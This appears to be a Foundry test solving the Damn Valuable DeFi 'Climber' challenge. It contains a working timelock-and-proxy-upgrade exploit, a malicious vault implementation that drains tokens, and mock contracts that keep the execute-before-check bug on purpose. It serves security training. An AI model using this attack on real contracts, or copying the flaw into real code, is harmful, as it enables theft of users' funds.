// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DamnValuableToken.sol";

// --- 1. DEFINISI INTERFACE (REMOTE CONTROL) ---
// Wajib ada biar kontrak tahu cara ngobrol sama Token DVT
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function updateDelay(uint64 newDelay) external;
    function grantRole(bytes32 role, address account) external;
}

interface IClimberVault {
    function upgradeTo(address newImplementation) external;
}

// --- 2. MALICIOUS IMPLEMENTATION (VAULT PALSU) ---

contract MaliciousVaultImplementation {
    // Fungsi jahat: Sapu bersih token
    function sweepFunds(address tokenAddress, address recipient) external {
        // Sekarang IERC20 sudah didefinisikan di atas, jadi ini aman!
        IERC20(tokenAddress).transfer(recipient, IERC20(tokenAddress).balanceOf(address(this)));
    }
    
    // Wajib ada untuk UUPS upgrade standard
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
    
    function upgradeTo(address newImplementation) external {}
}

// --- 3. ATTACKER CONTRACT (THE MIDDLEMAN) ---

contract ClimberAttacker {
    IClimberTimelock immutable timelock;
    address immutable vaultProxy;
    address immutable maliciousImpl;
    address immutable token;
    address immutable owner;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = keccak256("ANY_SALT");

    constructor(
        address _timelock, 
        address _vaultProxy, 
        address _maliciousImpl,
        address _token
    ) {
        timelock = IClimberTimelock(_timelock);
        vaultProxy = _vaultProxy;
        maliciousImpl = _maliciousImpl;
        token = _token;
        owner = msg.sender;
    }

    function attack() external {
        // 1. Update Delay ke 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(IClimberTimelock.updateDelay.selector, 0));

        // 2. Grant Role ke Attacker
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(
            IClimberTimelock.grantRole.selector, 
            keccak256("PROPOSER_ROLE"), 
            address(this)
        ));

        // 3. Upgrade Vault ke Malicious Implementation
        targets.push(address(vaultProxy));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(IClimberVault.upgradeTo.selector, maliciousImpl));

        // 4. Schedule Task (Jadwalkan SEKARANG JUGA via callback)
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(this.scheduleTask.selector));

        // Eksekusi (akan memicu 4 langkah di atas)
        timelock.execute(targets, values, dataElements, salt);

        // Panen Duit
        MaliciousVaultImplementation(vaultProxy).sweepFunds(token, owner);
    }

    function scheduleTask() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

// --- 4. TEST SCRIPT ---

contract ClimberChallenge is Test {
    address internal attacker;
    address internal deployer;
    
    DamnValuableToken token;
    ClimberTimelockMock timelock;
    ClimberVaultMock vaultProxy;
    
    function setUp() public {
        attacker = makeAddr("attacker");
        deployer = makeAddr("deployer"); // FIX: Pake makeAddr biar gak error Hex
        
        vm.startPrank(deployer);
        
        token = new DamnValuableToken();
        timelock = new ClimberTimelockMock(deployer, 1 hours);
        vaultProxy = new ClimberVaultMock(address(timelock), address(token));
        
        token.transfer(address(vaultProxy), 10000 ether);

        vm.stopPrank();
    }

    function test_Climber_Attack() public {
        vm.startPrank(attacker);
        
        console.log("Saldo Awal Attacker:", token.balanceOf(attacker));

        MaliciousVaultImplementation maliciousImpl = new MaliciousVaultImplementation();

        ClimberAttacker exploit = new ClimberAttacker(
            address(timelock),
            address(vaultProxy),
            address(maliciousImpl),
            address(token)
        );

        exploit.attack();

        vm.stopPrank();

        console.log("Saldo Akhir Attacker:", token.balanceOf(attacker));
        
        assertEq(token.balanceOf(attacker), 10000 ether, "Attacker should have swept funds");
    }
}

// --- MOCK CONTRACTS ---

contract ClimberTimelockMock {
    uint64 public delay;
    mapping(bytes32 => bool) public operations;
    mapping(bytes32 => uint64) public timestamps;

    constructor(address, uint64 _delay) {
        delay = _delay;
    }

    function getOperationId(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) public pure returns (bytes32) {
        return keccak256(abi.encode(targets, values, dataElements, salt));
    }

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external {
        bytes32 id = getOperationId(targets, values, dataElements, salt);
        require(!operations[id], "Already scheduled");
        operations[id] = true;
        timestamps[id] = uint64(block.timestamp) + delay;
    }

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable {
        // 1. Eksekusi Dulu (BUG UTAMA)
        for (uint256 i = 0; i < targets.length; ++i) {
            (bool success, ) = targets[i].call{value: values[i]}(dataElements[i]);
            require(success, "Execution failed");
        }

        // 2. Baru Cek Status
        bytes32 id = getOperationId(targets, values, dataElements, salt);
        require(operations[id], "Not scheduled");
        require(timestamps[id] <= block.timestamp, "Too early");
    }

    function updateDelay(uint64 newDelay) external {
        require(msg.sender == address(this), "Caller not Timelock");
        delay = newDelay;
    }

    function grantRole(bytes32, address) external {}
}

contract ClimberVaultMock {
    address public owner;
    address public token;
    address public implementation;
    bool public isUpgraded;

    constructor(address _owner, address _token) {
        owner = _owner;
        token = _token;
    }

    function upgradeTo(address newImpl) external {
        require(msg.sender == owner, "Only owner");
        implementation = newImpl;
        isUpgraded = true;
    }

    fallback() external payable {
        if (isUpgraded) {
            (bool s, ) = implementation.delegatecall(msg.data);
            require(s, "Delegate failed");
        }
    }
}